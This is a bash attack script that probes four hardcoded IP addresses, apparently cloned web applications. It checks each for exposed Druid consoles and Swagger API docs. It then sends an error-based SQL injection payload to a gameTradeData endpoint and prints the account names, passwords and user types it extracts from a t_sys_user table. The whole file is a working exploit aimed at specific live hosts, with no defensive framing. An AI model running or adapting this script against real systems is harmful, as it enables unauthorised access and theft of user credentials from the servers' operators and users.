#!/bin/bash
CLONES=("47.91.74.230" "43.156.55.142" "47.236.130.94" "162.62.230.203")
PAYLOAD="id,extractvalue(1,concat(0x7e,(SELECT%20GROUP_CONCAT(account,0x3a,password,0x3a,user_type,0x3a,nick,0x3a,status)%20FROM%20t_sys_user),0x7e))"

echo "=== Testing 4 Clone IPs for SQLi, Druid, Swagger ==="
echo ""

for IP in "${CLONES[@]}"; do
    echo ">>> TARGET: $IP"
    echo "--- Testing /druid/ ---"
    curl -s -o /dev/null -w "HTTP %{http_code} | " -m 5 "http://$IP/druid/index.html"
    curl -s -o /dev/null -w "HTTP %{http_code}\n" -m 5 "https://$IP/druid/index.html" 2>/dev/null || echo "HTTPS failed"
    
    echo "--- Testing /swagger-ui.html ---"
    curl -s -o /dev/null -w "HTTP %{http_code} | " -m 5 "http://$IP/swagger-ui.html"
    curl -s -o /dev/null -w "HTTP %{http_code}\n" -m 5 "https://$IP/swagger-ui.html" 2>/dev/null || echo "HTTPS failed"
    
    echo "--- Testing /v2/api-docs ---"
    curl -s -o /dev/null -w "HTTP %{http_code} | " -m 5 "http://$IP/v2/api-docs"
    curl -s -o /dev/null -w "HTTP %{http_code}\n" -m 5 "https://$IP/v2/api-docs" 2>/dev/null || echo "HTTPS failed"
    
    echo "--- Testing SQLi on /SysGameDataController/gameTradeData ---"
    # Try HTTP first
    RESP=$(curl -s -m 10 "http://$IP/SysGameDataController/gameTradeData?gameId=1&sort=$PAYLOAD" 2>&1)
    if echo "$RESP" | grep -q "XPATH syntax error"; then
        echo "[+] SQLi SUCCESS on HTTP! Extracted data:"
        echo "$RESP" | grep -o "XPATH syntax error: '[^']*'" | head -1
    else
        echo "[-] SQLi failed on HTTP (no XPATH error)"
    fi
    
    # Try HTTPS
    RESP=$(curl -s -m 10 "https://$IP/SysGameDataController/gameTradeData?gameId=1&sort=$PAYLOAD" 2>&1)
    if echo "$RESP" | grep -q "XPATH syntax error"; then
        echo "[+] SQLi SUCCESS on HTTPS! Extracted data:"
        echo "$RESP" | grep -o "XPATH syntax error: '[^']*'" | head -1
    else
        echo "[-] SQLi failed on HTTPS (no XPATH error)"
    fi
    
    echo ""
done
